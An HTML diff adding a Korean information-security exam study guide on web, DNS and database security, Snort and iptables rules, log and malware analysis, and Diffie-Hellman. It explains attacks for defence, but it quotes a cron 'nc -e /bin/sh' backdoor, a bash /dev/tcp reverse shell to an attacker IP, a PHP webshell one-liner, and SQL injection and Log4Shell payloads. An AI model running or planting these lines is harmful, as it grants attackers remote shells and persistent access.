+  <li>그 밖에: 최소 권한으로 DB 구동, 동적 SQL 금지, 특수문자(' " / \ ; : 공백 -- +) 검증, 에러 메시지 숨김, 화이트리스트, 스키마 정보 숨김</li></ul></li>
+<li>디렉터리 리스팅(인덱싱) — 파일 목록이 그대로 보임. 응답이 <b>200 OK + "Index of"</b>면 공격 성공. 대응: httpd.conf의 <code>Options</code>에서 <b>Indexes</b> 제거(또는 <code>-Indexes</code>)</li>
+<li>상위 디렉터리 접근 금지 — <code>AllowOverride None</code>이면 .htaccess가 안 먹음 → <code>AllowOverride AuthConfig</code>로 바꾸고 .htaccess에 AuthName/AuthType Basic/AuthUserFile/Require valid-user, <code>htpasswd -c</code>로 계정 생성, Apache 재시작</li>
+<li>파일 업로드 대응
+  <ul><li>점검: 서버 스크립트 파일 업로드 가능 여부, 업로드된 파일 실행 가능 여부</li>
+  <li>조치: 확장자 필터링(화이트리스트), 파일명·확장자 변경, 전용 디렉터리에 저장하고 실행 제한, 특수문자 필터링</li>
+  <li>.htaccess: <code>&lt;FilesMatch "\.(ph|inc|lib)"&gt;</code>로 직접 호출 차단, <code>AddType text/html .php</code>로 실행 대신 텍스트로 처리</li>
+  <li>우회 기법: Content-Type 변조, 확장자 바꾸기(webshell.jpg), Null 바이트(webshell.php%00.jpg). 클라이언트 측 검사만 믿으면 뚫림</li></ul></li>
+<li>쿠키 속성 (<code>Set-Cookie: id=x; Secure; HttpOnly</code>)
+  <ul><li><b>Secure</b> — HTTPS로만 전송 → 스니핑·중간자 방지 / <b>HttpOnly</b> — 자바스크립트(document.cookie)로 접근 불가 → XSS 쿠키 탈취 방지 / <b>Expires</b> — 짧은 만료로 탈취돼도 빨리 무효화</li></ul></li>
+<li>Apache 설정 항목: <code>Timeout</code>(응답 없으면 끊는 대기 시간) / <code>MaxKeepAliveRequests</code>(Keep-Alive 최대 수) / <code>DirectoryIndex</code>(기본 문서 순서) / <code>ErrorLog</code>, <code>CustomLog</code>(로그 경로, httpd.conf에서 지정) / 로그는 Access Log(정상 접속)와 Error Log</li>
+<li><b>robots.txt</b> — 사이트 루트에 두어 크롤러에게 수집 금지 경로를 지시. <code>Disallow: /admin/</code>, <code>Disallow: /*.pdf$</code></li>
+<li><b>웹 프록시 도구</b>(Burp Suite, OWASP ZAP, Paros) — 요청을 가로채 변조하며 취약점 점검</li>
+<li>cron 백도어 예: <code>0 0 12 * * root /usr/bin/nc 1.1.1.1 80 -e /bin/sh</code> = 매월 12일 0시에 root로 공격자에게 접속해 쉘을 넘김(리버스 쉘)</li></ul></article>
+<article class="topic"><h2><span class="n">05</span>DNS 보안</h2><div class="qs">ch1-04 Q1~Q7 · 서술 Q1 · ch4 Q1 · 서술 Q1</div><p class="why">DNS는 인터넷의 전화번호부다. 구조(존·레코드·서버 종류)를 알아야 스푸핑·증폭·존 전송 같은 공격과 설정 문제를 이해할 수 있다.</p><ul><li>기본: 도메인 이름 ↔ IP 변환. 보통 <b>UDP 53</b>, 응답이 512바이트를 넘거나 존 전송 등 특수한 경우 <b>TCP 53</b>. 조회 결과는 <b>TTL</b>만큼 <b>캐시</b></li>
+<li><b>존 파일</b> — 도메인의 DNS 레코드를 저장하는 DB / <b>자원 레코드(RR)</b> — 이름과 값의 매핑 / <b>hosts 파일</b> — DNS보다 먼저 참조하는 수동 매핑 파일</li>
+<li>네임 서버 종류: 루트 → TLD(.com 등) → <b>Authoritative</b>(책임, 실제 레코드 보유) / <b>Cache</b>(리졸버, 결과를 캐시)</li>
+<li><b>DNS 스푸핑</b> — 응답을 조작하거나 캐시를 오염시켜 가짜 사이트로 유도. 중간자가 질의를 보고 진짜보다 먼저 가짜 응답</li>
+<li><b>DNS 증폭 공격</b> — 출발지를 피해자로 위조하고 <b>ANY</b> 질의(응답이 큼)를 오픈 DNS에 보내 피해자에게 큰 응답이 몰리게 함. DNS는 인증이 없어 가능</li>
+<li><b>서브 도메인 하이재킹</b> — 쓰지 않는 CNAME(클라우드 서비스)을 지우지 않아 공격자가 그 서비스를 재등록해 서브 도메인을 차지</li>
+<li><b>존 전송(Zone Transfer) 제한</b> — <code>dig @서버 도메인 axfr</code>로 전체 존 데이터가 나오면 취약. <code>/etc/named.conf</code>의 <code>allow-transfer { 192.168.0.1; };</code>로 보조 서버에만 허용</li></ul></article>
+<article class="topic"><h2><span class="n">06</span>데이터베이스 보안</h2><div class="qs">ch1-05 Q1~Q3 · 서술 Q1 · ch4 Q8 · 서술 Q10·Q12</div><p class="why">DB는 가장 가치 있는 자산이 모인 곳이다. 통제 기법, 간접 유출 공격, 암호화 방식, 계정·권한·감사 설정이 나온다.</p><ul><li>통제 기법: <b>접근 통제</b>(권한 관리) / <b>추론 통제</b>(간접 유추 방지: 질의 제한, 응답 한정) / <b>흐름 통제</b>(높은 등급 → 낮은 등급으로 흐르지 않게)</li>
+<li>공격 유형: <b>집합성(Aggregation)</b> — 낮은 등급 정보 조각을 모아 높은 등급 정보를 알아냄 / <b>추론(Inference)</b> — 비밀이 아닌 정보로 기밀을 유추 / <b>데이터 디들링</b> — 입력·처리 중 데이터를 몰래 변조</li>
+<li>컬럼 암호화 방식: <b>API</b>(앱 서버에 라이브러리, 앱이 호출) / <b>Plug-in</b>(DB 서버에 설치, DBMS가 호출) / Hybrid / <b>TDE</b>(DBMS가 투명하게 암·복호화, 앱 수정 불필요)</li>
+<li>데이터 마스킹: <b>정적</b> — 저장·공유 전에 영구 변환(운영 DB → 개발 DB) / <b>동적</b> — 조회 시 SQL을 바꿔 화면에만 가림(실제 데이터는 그대로)</li>
+<li>계정·권한: DBA 외에는 <b>CREATE · ALTER · DROP</b> 권한 금지. 기본 계정 비밀번호 변경, 불필요 계정 제거·잠금, 비밀번호 기간·복잡도, 관리자 권한 최소화, 원격 접속 제한, 리스너 비밀번호, Public Role 금지</li>
+<li>MySQL 외부 접속: <code>my.cnf</code>의 <code>bind-address = 127.0.0.1</code>(로컬만) → <code>0.0.0.0</code> 또는 주석 처리</li>
+<li>Oracle 감사: <b>AUDIT_TRAIL</b> = NONE(끔) / DB(SYS.AUD$에 저장) / OS. 설정: <code>ALTER SYSTEM SET AUDIT_TRAIL=DB SCOPE=SPFILE;</code>(재시작 필요). 감사 로그는 <b>외부 시스템에 실시간 전송</b>해야 변조 불가·연속성·DBA 추적 가능</li></ul></article>
+<article class="topic"><h2><span class="n">07</span>취약점 체계와 대표 취약점</h2><div class="qs">ch2-01 Q1~Q6 · 서술 Q1</div><p class="why">취약점은 번호(CVE)와 점수(CVSS)로 관리된다. 이름만 들으면 '무엇이 왜 뚫리는지' 설명할 수 있어야 하는 유명 취약점이 몇 개 있다.</p><ul><li><b>CVE</b> — MITRE가 운영하는 취약점 고유번호. <code>CVE-YYYY-NNNN</code>(연도-번호) / <b>CVSS</b> — 심각도 점수 0~10(10이 최악). 기본·시간·환경 메트릭</li>
+<li><b>HeartBleed</b> — OpenSSL Heartbeat 확장이 요청 길이를 검증하지 않아 메모리 <b>64KB</b>씩 유출. 취약 버전 <b>1.0.1~1.0.1f</b>, 1.0.2-beta. 대응: 1.0.1g 이상 업데이트, Heartbeat 비활성화, 인증서 재발급, 비밀번호 재설정</li>
+<li><b>POODLE</b> — TLS 연결을 <b>SSL 3.0</b>으로 다운그레이드시킨 뒤 CBC 패딩 오라클로 복호화. 대응: SSL 3.0 비활성화</li>
+<li><b>Log4Shell</b>(Log4j, CVE-2021-44228) — 로그에 기록되는 값에 <code>${jndi:ldap://...}</code>를 넣으면 JNDI·LDAP로 원격 코드 실행(RCE)</li></ul></article>
+<article class="topic"><h2><span class="n">08</span>개발 보안</h2><div class="qs">ch2-02 Q1~Q3 · 서술 Q1·Q2</div><p class="why">보안은 만들 때부터 넣어야 싸다. 테스트 방법 구분, 소스코드 보안 약점 7유형, 분석 단계 산출물을 묻는다.</p><ul><li>테스트 방식: <b>블랙박스</b>(소스 모르고 외부 인터페이스로) / <b>화이트박스</b>(소스를 보며) / <b>그레이박스</b>(일부 내부 정보)</li>
+<li>소스코드 보안 약점 7유형: ① <b>입력 데이터 검증 및 표현</b>(SQL 삽입·XSS·명령어 삽입 등) ② <b>보안 기능</b>(인증·접근제어·암호화 부적절) ③ <b>시간 및 상태</b>(멀티스레드, 레이스 컨디션) ④ <b>에러 처리</b>(에러 메시지 정보 노출) ⑤ <b>코드 오류</b>(형 변환, 버퍼 오버플로우) ⑥ <b>캡슐화</b>(중요 데이터 노출) ⑦ <b>API 오용</b></li>
+<li>불안전한 암호화 저장 점검: 중요 정보가 SQL Query로 열람 불가한가, 세션 ID·쿠키가 랜덤한가, 적절한 암호화 알고리즘인가</li>
+<li>XML 조회 검증: 공통 검증 컴포넌트로 필터링, 미리 작성된 질의문에 바인딩, 안전한 API 사용</li>
+<li>CBD 분석 단계 산출물: <b>요구사항 정의서 · 요구사항 추적표 · 유즈케이스 명세서 · 유즈케이스 다이어그램</b></li></ul></article>
+<article class="topic"><h2><span class="n">09</span>시스템 공격 기법</h2><div class="qs">ch3-01 Q1~Q11 · 서술 Q1</div><p class="why">메모리 구조를 알아야 버퍼 오버플로우와 그 방어(카나리·ASLR)가 이해된다. 나머지는 공격 이름과 정의를 짝짓는 문제다.</p><ul><li>메모리 영역: <b>스택</b>(지역 변수·매개변수·<b>복귀 주소</b>, 함수 끝나면 소멸) / <b>힙</b>(malloc·new로 동적 할당)</li>
+<li><b>버퍼 오버플로우</b> — 버퍼 크기를 넘는 입력으로 복귀 주소를 덮어 실행 흐름을 바꿈. 원인 함수: <code>strcpy</code>(길이 검사 없음) → <code>strncpy</code> 등으로 교체
+  <ul><li><b>카나리(Canary)</b> — 복귀 주소와 변수 사이에 검사용 값을 넣고, 변했으면 복귀하지 않음</li>
+  <li><b>ASLR</b> — 메모리 시작 주소를 실행 때마다 무작위로 배치해 주소 예측 불가</li></ul></li>
+<li><b>사이버 킬 체인</b> — 록히드 마틴. 공격을 7단계로 나눠 각 단계에서 차단 / <b>MITRE ATT&amp;CK</b> — 실제 공격 사례의 전술(Tactics)·기술(Techniques)을 정리한 프레임워크</li>
+<li><b>공급망 공격</b> — 개발사 네트워크에 침투해 소스·배포 서버를 변조, 사용자는 정상 업데이트로 감염 / <b>DDE</b> — 윈도우 앱 간 데이터 교환 기술을 악용해 문서 열면 악성코드 실행</li>
+<li><b>크리덴셜 스터핑</b> — 유출된 ID·비밀번호를 다른 사이트에 대입 / <b>레이스 컨디션</b> — SetUID 프로그램이 임시 파일을 만드는 틈에 심볼릭 링크를 걸어 다른 파일을 조작</li>
+<li><b>APT</b> — 특정 대상을 장기간·지능적·지속적으로 공격 / <b>제로데이</b> — 패치가 나오기 전 취약점 공격 / <b>TEMPEST</b> — 전자파 방사로 정보가 새는 것을 막는 표준(부채널 공격 대응)</li></ul></article>
+<article class="topic"><h2><span class="n">10</span>악성코드와 분석 도구</h2><div class="qs">ch3-02 Q1·Q2 · ch3-03 Q1</div><p class="why">악성코드의 역할별 이름과, 시스템 변조를 알아내는 도구를 묻는다.</p><ul><li><b>다운로더</b> — 감염 후 지정 주소에서 다른 악성코드를 받아 실행 / <b>드롭퍼</b> — 자기 안에 압축해 둔 코드로 악성코드 생성 / <b>인젝터</b> — 다른 프로세스에 코드를 주입</li>
+<li><b>애드웨어</b> — 동의 없이 광고 표시 / <b>멀버타이징</b> — 온라인 광고에 악성코드를 숨겨 보거나 클릭만 해도 감염</li>
+<li><b>무결성 점검 도구</b>(Tripwire, Fcheck, Samhain) — 중요 파일의 DB를 만들어 두고 나중에 비교해 변조 탐지 / <b>Nessus</b> — 취약점 진단 도구</li></ul></article></section>
+<section class="subj" id="c4"><div class="subj-head"><h2>4과목 보안 관제 및 침해사고 대응</h2><div class="note">ch1 보안 도구(01 보안 운영 도구 / 02 보안 점검 도구) · ch2 로그 및 침해사고 분석(01 로그 분석 / 02 침해사고 분석) · 주제 9개</div></div><article class="topic"><h2><span class="n">01</span>Snort 룰의 구조</h2><div class="qs">ch1-01 Q1·Q2·Q4·Q6 · 서술 Q4·Q5·Q7·Q8 · ch2-02 서술 Q1·Q7·Q12</div><p class="why">Snort는 오픈소스 IDS/IPS로, 4과목에서 가장 많이 나온다. 룰 한 줄을 읽고 뜻을 설명하거나 빈칸을 채우는 문제이므로 헤더와 옵션의 의미를 정확히 알아야 한다.</p><ul><li>룰 = <b>헤더</b> + (<b>옵션</b>)
+  <ul><li>헤더: <code>action 프로토콜 출발지IP 출발지포트 -&gt; 목적지IP 목적지포트</code> 예) <code>alert tcp any any -&gt; any 80</code> = 모든 곳에서 80포트로 가는 TCP를 검사해 경고. <code>&lt;&gt;</code>는 양방향</li>
+  <li>포트는 서비스로 정한다: HTTP 80, Telnet 23, FTP 21, HTTPS 443</li></ul></li>
+<li>action(탐지 시 처리)
+  <ul><li><b>alert</b> 경고+로그 / <b>log</b> 로그만 / <b>pass</b> 무시 / <b>drop</b> 차단+로그 / <b>reject</b> 차단+로그+응답(TCP RST, UDP ICMP Unreachable) / <b>sdrop</b> 차단만, 로그 없음</li>
+  <li>"차단하고 로그를 남기는" 두 가지 = drop, reject</li></ul></li>
+<li>자주 나오는 옵션
+  <ul><li><b>msg</b> — 탐지 시 출력할 메시지. 탐지에는 영향 없음</li>
+  <li><b>content</b> — 페이로드에서 찾을 문자열. 기본은 <b>대소문자 구분</b>. <code>content:!"x"</code>는 x가 <b>없어야</b> 매칭. <code>|00|</code>처럼 파이프 안은 16진수 바이너리</li>
+  <li><b>nocase</b> — 대소문자 구분 없이 (예: /Login.php를 /login.php 룰로 잡으려면 필요)</li>
+  <li><b>offset</b> — 검색 시작 위치 / <b>depth</b> — 검색 범위 길이. 처음부터 N바이트만 보려면 offset 생략(=0), depth:N</li>
+  <li><b>distance</b> — 직전 매칭 지점에서 N바이트 떨어진 곳부터 / <b>within</b> — 직전 매칭 후 N바이트 안에서</li>
+  <li><b>pcre</b> — 정규표현식. 유연하지만 부하가 커서 any any에 걸면 장비 성능 저하 → 목적지 IP·포트를 좁혀야 함</li>
+  <li><b>sid</b> — 룰 고유 번호</li></ul></li>
+<li><b>threshold</b> — 이벤트 횟수 제한. <code>threshold:type &lt;limit|threshold|both&gt;, track &lt;by_src|by_dst&gt;, count N, seconds S</code>
+  <ul><li><b>limit</b> — S초 동안 최대 N번까지만 경고 / <b>threshold</b> — S초 동안 N번 이상이면 경고(조건 충족마다 반복) / <b>both</b> — N번 이상이면 S초에 딱 1번만 경고</li>
+  <li>예) <code>type threshold, track by_src, count 10, seconds 1</code> = 같은 출발지에서 1초에 10번 이상이면 경고 (GET Flooding 탐지)</li></ul></li>
+<li>룰 작성 예: 텔넷(23)으로 가는 패킷의 첫 14바이트 안에 anonymous가 있으면 "Dangerous" → <code>alert tcp any any -&gt; any 23 (msg:"Dangerous"; content:"anonymous"; offset:0; depth:14;)</code></li></ul></article>
+<article class="topic"><h2><span class="n">02</span>Snort 룰로 탐지하는 대표 공격</h2><div class="qs">ch1-01 서술 Q5·Q7·Q8 · ch2-02 서술 Q1·Q7·Q12</div><p class="why">룰 문제는 결국 '이 룰이 어떤 공격을 잡는가'로 이어진다. 공격별로 룰에 들어가는 특징 문자열을 알아 두면 역으로 해석할 수 있다.</p><ul><li><b>HTTP GET Flooding</b> — 같은 출발지에서 <code>GET / HTTP/1.</code> 요청을 초당 수십 번 → threshold(track by_src, count 10, seconds 1)로 탐지</li>
+<li><b>XSS</b> — URL에 <code>%3Cscript%3E</code>(= &lt;script&gt;) 포함. 경로 대소문자(Login.php)를 바꿔 우회하므로 <b>nocase</b> 필요</li>
+<li><b>익명 FTP 접속</b> — 21포트로 <code>USER anonymous</code>. "AnOnYmOuS"처럼 섞어 써도 nocase면 탐지. 꼭 필요한 경우가 아니면 anonymous FTP는 disable</li>
+<li><b>HeartBleed</b> — TLS 포트(443, 465, 523)에서 <code>|18 03 00|</code>(Heartbeat, TLS1.0) + <code>|01|</code>(Request) 뒤에 길이 바이트 검사(<code>content:!"|00|"</code>)</li>
+<li><b>GET Flooding 룰 해석 예</b>: <code>content:"USER"; content:!"anonymous"</code> = USER는 있고 anonymous는 없는 패킷 / <code>content:"|00|"; depth:1</code> = 첫 바이트가 NULL</li></ul></article>
+<article class="topic"><h2><span class="n">03</span>IDS/IPS 도구: Snort · Suricata · ModSecurity · YARA</h2><div class="qs">ch1-01 Q3·Q4·Q5</div><p class="why">도구 설명을 보고 이름을 쓰는 문제다. 각 도구의 '출신'과 '특징 한 가지'로 구분한다.</p><ul><li><b>Snort</b> — 오픈소스 IDS/IPS의 원조. 단일 스레드</li>
+<li><b>Suricata(수리카타)</b> — OISF가 2010년 개발. Snort 룰과 호환되면서 <b>멀티 코어·멀티 스레드</b>로 대용량 트래픽 실시간 분석. Lua로 탐지 로직 작성 가능</li>
+<li><b>ModSecurity</b> — Trustwave가 개발한 오픈소스 <b>웹 방화벽(WAF)</b>. Apache 등 웹 서버에서 실행
+  <ul><li>SecRuleEngine: On(차단) / Off / <b>DetectionOnly</b>(탐지만) · SecAuditEngine: On / Off / RelevantOnly(오류·경고만 로깅)</li></ul></li>
+<li><b>YARA</b> — VirusTotal 제작. 악성코드의 문자열·바이너리 패턴으로 룰을 만들어 <b>분류·탐지</b>. 정적 분석, 포렌식에 활용</li></ul></article>
+<article class="topic"><h2><span class="n">04</span>iptables 방화벽</h2><div class="qs">ch1-01 서술 Q2·Q3·Q6·Q9·Q10</div><p class="why">리눅스 방화벽 명령을 읽고 뜻을 설명하거나 옵션을 채우는 문제다. 체인·매치·타깃의 세 부분을 알면 어떤 명령이든 읽힌다.</p><ul><li>기본 체인(Chain) 3가지: <b>INPUT</b>(들어오는 패킷) / <b>FORWARD</b>(경유하는 패킷) / <b>OUTPUT</b>(나가는 패킷). 대문자로 써야 함</li>
+<li>구조: <code>iptables -A 체인 [매치 조건] -j 타깃</code>
+  <ul><li>조건: <code>-p tcp</code>(프로토콜) <code>--dport 80</code>(목적지 포트) <code>--sport 123</code>(출발지 포트) <code>--syn</code>(SYN만 켜진 패킷) <code>! --syn</code>(SYN이 아닌)</li>
+  <li>모듈: <code>-m limit --limit 10/s</code>(초당 10개까지 허용) / <code>-m recent --update --seconds 2 --hitcount 30 --name 이름</code>(같은 IP가 2초에 30번 이상) / <code>-m state --state NEW</code>(새 연결) / <code>-m length --length 100:</code>(100바이트 이상)</li></ul></li>
+<li>타깃(-j)
+  <ul><li><b>ACCEPT</b> 허용 / <b>DROP</b> 응답 없이 버림 / <b>REJECT</b> 버리고 ICMP 에러 또는 TCP RST 응답 / <b>LOG</b> syslog(/var/log/messages)에 기록, <code>--log-prefix "[문구]"</code></li>
+  <li>보안상 <b>DROP</b>이 낫다: REJECT의 응답 메시지가 공격자에게 정보가 되고 DDoS에 악용될 수 있음</li></ul></li>
+<li>예시 풀이
+  <ul><li>SYN Flooding 방어: <code>-A INPUT -p tcp --syn --dport 80 -m limit --limit 10/s -j DROP</code> (초당 10개 초과 차단)</li>
+  <li>NTP 증폭 방어: <code>-A OUTPUT -p udp --sport 123 -m length --length 100: -j DROP</code> (NTP 응답 중 100바이트 이상 차단)</li>
+  <li>비정상 연결 로그: <code>-p tcp ! --syn -m state --state NEW -j LOG</code> (새 연결인데 SYN이 아니면 기록)</li></ul></li></ul></article>
+<article class="topic"><h2><span class="n">05</span>패킷 분석 도구: tcpdump · Wireshark · hping3</h2><div class="qs">ch1-01 서술 Q2 · ch1-02 Q1·Q2 · 서술 Q1·Q2</div><p class="why">캡처 화면을 보고 공격을 판단하거나, 특정 패킷만 보는 명령·필터를 쓰는 문제다.</p><ul><li><b>tcpdump</b> — <code>tcpdump [옵션] [BPF 필터]</code>
+  <ul><li>옵션: <code>-i eth0</code> 인터페이스 / <code>-n</code> 호스트명 대신 IP·포트 숫자로 / <code>-v</code> 상세 / <code>-w</code> 파일 저장 / <code>-c</code> 개수</li>
+  <li>BPF: <code>tcp</code> <code>udp</code> <code>icmp</code> <code>host IP</code> <code>src host IP</code> <code>dst host IP</code> <code>port N</code>. 예) <code>tcpdump -i eth0 -n src host 192.168.1.3 and dst host 192.168.10.48</code></li>
+  <li>단편화 표시 <code>frag ID:SIZE@OFFSET+</code> — ID=같은 패킷 조각의 식별자, SIZE=조각 길이, OFFSET=원본에서의 위치, <b>+</b>=뒤에 조각이 더 있음(MF 플래그)</li></ul></li>
+<li><b>Wireshark 필터</b>: <code>ip.addr == x</code> / <code>ip.src != x</code> / <code>tcp.port == 443</code> / <code>eth.addr == MAC</code> / <code>dns.response_to</code>(DNS 응답만)</li>
+<li><b>hping3</b> — Salvatore Sanfilippo가 만든 리눅스 패킷 생성·분석 도구. DoS 공격 도구로도 쓰임
+  <ul><li>옵션: <code>-a</code> 출발지 IP 변조 / <code>-c</code> 개수 / <code>-i</code> 간격 / <code>-p</code> 목적지 포트 / <code>-S</code> SYN / <code>-A</code> ACK / <code>-F</code> FIN / <code>--icmp</code> / <code>--flood</code> 대량 전송</li></ul></li></ul></article>
+<article class="topic"><h2><span class="n">06</span>캡처·로그로 공격 판단하기 ① DoS 계열</h2><div class="qs">ch1-01 서술 Q2·Q6 · ch2-02 Q1 · 서술 Q3·Q5·Q9·Q11</div><p class="why">화면에서 '이상한 패턴'을 찾아 공격 이름을 쓰고 원리·대응을 설명하는 문제다. 공격마다 눈에 띄는 단서가 정해져 있다.</p><ul><li><b>TCP SYN Flooding</b> — 단서: 여러 출발지에서 같은 포트로 SYN만 반복, <code>netstat</code>에 <b>SYN-RECEIVED</b> 다수. 백로그 큐가 차서 새 연결 거부. 대응: iptables limit, SYN 쿠키</li>
+<li><b>Smurf</b> — 단서: ICMP Echo Request가 <b>브로드캐스트 주소</b>(x.x.x.255)로 반복. 출발지를 피해자 IP로 위조해 보내면 네트워크의 모든 호스트가 피해자에게 응답. 대응: 라우터에서 <b>Directed Broadcast</b> 차단, 호스트가 브로드캐스트 ICMP에 응답하지 않게 설정, IPS에서 다량 Echo Reply 차단</li>
+<li><b>Slowloris(Slow HTTP Header DoS)</b> — 단서: HTTP 헤더 끝 <code>\r\n\r\n</code>(0D0A0D0A) 대신 <code>\r\n</code>만 보내 헤더를 끝내지 않음. 연결을 오래 붙잡아 세션 고갈. 대응: <b>Session Timeout</b> 설정, 개행이 한 번만 있는 패킷 시그니처 차단</li>
+<li><b>RUDY(Slow HTTP POST DoS)</b> — 단서: <b>Content-Length를 매우 크게</b>(예: 100000000) 보내 놓고 본문을 몇 바이트씩 천천히 전송. 대응: Content-Length 임계치, Session Timeout</li>
+<li><b>DNS 증폭</b> — 단서: 같은 도메인에 <b>ANY</b> 타입 질의 반복. 작은 질의로 큰 응답을 만들고(증폭), 출발지를 피해자로 위조. 가능한 이유: ANY의 증폭 효과 + DNS는 인증이 없는 오픈 서버</li>
+<li><b>NTP monlist 증폭</b> — 출발지를 피해자로 위조한 monlist 요청을 여러 NTP 서버에 보내 큰 응답이 몰리게 함. 대응: NTP 서버가 100바이트 이상 응답을 내보내지 않도록 iptables로 차단</li></ul></article>
+<article class="topic"><h2><span class="n">07</span>캡처·로그로 공격 판단하기 ② 웹·시스템 공격</h2><div class="qs">ch2-02 Q2·Q3 · 서술 Q2·Q4·Q6·Q10·Q13</div><p class="why">웹 로그 한 줄이나 명령어를 보고 공격 이름을 쓰는 문제다. URL 인코딩을 풀어 읽는 연습이 필요하다. (%27=', %20=공백, %3D==, %3C=&lt;, %3E=&gt;, %2C=,)</p><ul><li><b>SQL Injection</b> — 단서: <code>id=1' or '1'='1'#</code>, <code>pw='1' or 1=1</code>처럼 따옴표와 or 조건으로 로그인 검증식을 참으로 만듦. 대응: <b>Prepared Statement</b>(매개변수 바인딩), 특수문자 입력 검증, 에러 메시지 숨김, 화이트리스트, 최소 권한, 스키마 정보 유출 방지</li>
+<li><b>Blind SQL Injection</b> — 단서: <code>substr(password,2,1)='0'</code>처럼 한 글자씩 조건을 바꿔 가며 반복 요청. 응답 크기(200 3926 vs 1739)나 내용 출력 여부(True/False)로 참·거짓을 판단해 DB명·비밀번호를 한 글자씩 알아냄 (Boolean-based). 클라이언트 측(자바스크립트) 검증은 프록시(Burp Suite)로 우회되므로 <b>서버 측</b> 검증이 필요</li>
+<li><b>쉘쇼크(Shellshock)</b> — Bash가 환경변수의 함수 선언 <code>() { :; };</code> 뒤에 붙은 명령을 검증 없이 실행하는 취약점(CVSS 10점). 웹쉘 파일 생성(<code>echo "&lt;?php system($_GET[cmd]); ?&gt;" &gt; shell.php</code>)이나 <b>리버스 쉘</b>(<code>/bin/bash -i &gt;&amp; /dev/tcp/공격자IP/80 0&gt;&amp;1</code>) 연결에 악용</li>
+<li><b>IIS 유니코드 취약점</b> — 단서: <code>..%c1%1c../winnt/system32/cmd.exe</code>. %c1%1c가 /로 해석돼 상위 디렉터리로 이동(디렉터리 트래버설). 상태 코드 <b>404면 실패, 200이면 성공</b>. 대응: IIS 패치, 웹 루트를 OS 드라이브(C:)와 다른 드라이브에, 인코딩 패턴 필터링</li>
+<li><b>HeartBleed 점검</b> — <code>openssl version</code>이 1.0.1~1.0.1f면 취약. <code>openssl s_client -tlsextdebug</code>로 heartbeat 확장 확인. 대응: 시스템적=OpenSSL 1.0.1g 이상으로 업데이트, 소스(ssl/d1_both.c) 확인 / 서비스적=불필요한 Heartbeat 제거, 인증서 재발급, 비밀번호 재설정</li></ul></article>
+<article class="topic"><h2><span class="n">08</span>악성코드·시스템 분석</h2><div class="qs">ch2-01 서술 Q1·Q2·Q4 · ch2-02 서술 Q8</div><p class="why">침해사고가 나면 악성코드가 '무엇을 했는지'와 '어떻게 분석하는지'를 묻는다. 분석 방법 세 가지와 레지스트리·/proc를 읽는 법이 핵심이다.</p><ul><li><b>Drive By Download</b> — 해킹된 웹사이트의 iframe·자바스크립트·리다이렉션으로 사용자를 여러 경유지를 거쳐 <b>최종 유포 사이트</b>로 보내고, 거기서 PC 취약점으로 악성코드 감염. 실제 감염되는 곳 = 최종 유포 사이트</li>
+<li>악성 파일(PE) 분석 방법 3가지
+  <ul><li><b>정적 분석</b> — 실행하지 않고 바이너리 구조·코드를 분석</li>
+  <li><b>동적 분석</b> — 실제로 실행해 전후 상태를 비교</li>
+  <li><b>자동화 분석</b> — 도구로 정적+동적을 결합해 전체 흐름 파악</li></ul></li>
+<li>윈도우 변경 사항 읽기 (SysAnalyzer 스냅샷)
+  <ul><li><code>CreateFileA</code> → 파일 생성 / <code>...\Run\x.exe</code> → 부팅 시 자동 실행 / <code>...\Services\x.exe</code> → 서비스 등록 / <code>FirewallPolicy...\OpenPorts\9070:TCP</code> → 방화벽에 포트 허용(백도어 의심) / <code>Hidden\SHOWALL\0</code> → 숨김 파일 안 보이게 / <code>batfile\shell\runas\command</code> → .bat 실행 명령 조작 / <code>Directory\Shell\CommandPrompt\command</code> → 우클릭 명령 프롬프트를 악성 파일로 바꿈</li></ul></li>
+<li>삭제된 백도어 분석 (<code>/proc/PID</code>)
+  <ul><li>파일이 없는 이유: 실행 후 파일을 삭제해도 프로세스는 메모리에 남음</li>
+  <li>복원: <code>cp /proc/5900/exe /tmp/backdoors</code> (exe는 실행 중 바이너리를 가리킴)</li>
+  <li>사용 명령 확인: <code>history</code>, <code>cat /proc/5900/cmdline</code>, <code>lastcomm</code>(파라미터는 안 보임), <code>acctcom</code></li></ul></li></ul></article>
+<article class="topic"><h2><span class="n">09</span>Apache 로그 읽기</h2><div class="qs">ch2-01 서술 Q3</div><p class="why">웹 로그 한 줄의 각 칸이 무엇인지 알아야 공격 로그 문제를 풀 수 있다. combined 형식 기준으로 순서를 외운다.</p><ul><li><code>1.2.3.4 - - [30/May/2025:01:20:01 +09:00] "GET /bulletin/read.php?no=101&amp;item=book HTTP/1.1" 200 359 "http://soojebi.co.kr/main.php" "Mozilla/5.0 ..."</code></li>
+<li>순서: <b>클라이언트 IP</b> · 식별자(-) · 인증 사용자(-) · <b>요청 시간</b> · <b>요청 라인</b>(메서드 경로?파라미터 프로토콜) · <b>상태 코드</b> · <b>응답 바이트</b> · <b>Referer</b>(이전 페이지) · <b>User-Agent</b>(브라우저·OS)</li>
+<li><code>no=101&amp;item=book</code> = 파라미터 두 개에 값을 넣어 요청 / <b>200</b> = 정상 처리, <b>404</b> = 없는 자원(공격 실패), <b>403</b> = 접근 거부</li></ul></article></section>
+<section class="subj" id="c5"><div class="subj-head"><h2>5과목 정보보안 일반</h2><div class="note">ch1 암호학 / ch2 ISMS-P 및 정보보호 제품인증 / ch3 기타 · 주제 11개</div></div><article class="topic"><h2><span class="n">01</span>Diffie-Hellman 키 교환</h2><div class="qs">ch1-01 Q1</div><p class="why">암호화 통신을 하려면 양쪽이 같은 비밀키를 가져야 하는데, 키를 그냥 보내면 중간에서 가로챈다. DH는 키를 보내지 않고도 같은 키를 만들어 내는 방법이다. 식의 빈칸을 채우는 문제로 나온다.</p><ul><li>준비: Alice가 소수 <b>p</b>와 p보다 작은 원시근 <b>g</b>를 고른다 (공개해도 됨)</li>
+<li>각자 개인키를 정하고 공개키를 계산해 서로 보낸다
+  <ul><li>Alice: 개인키 a → 공개키 <b>A = g<sup>a</sup> mod p</b></li>
+  <li>Bob: 개인키 b → 공개키 <b>B = g<sup>b</sup> mod p</b></li></ul></li>
+<li>받은 공개키에 자기 개인키를 지수로 올리면 둘 다 같은 값이 나온다 → 공유키 <b>g<sup>ab</sup> mod p</b>
+  <ul><li>Alice: B<sup>a</sup> = (g<sup>b</sup>)<sup>a</sup> = g<sup>ab</sup> / Bob: A<sup>b</sup> = (g<sup>a</sup>)<sup>b</sup> = g<sup>ab</sup></li></ul></li>
+<li>중간에서 g, p, A, B를 다 봐도 a, b를 모르면 공유키를 못 만든다 (이산대수 문제의 어려움)</li></ul></article>
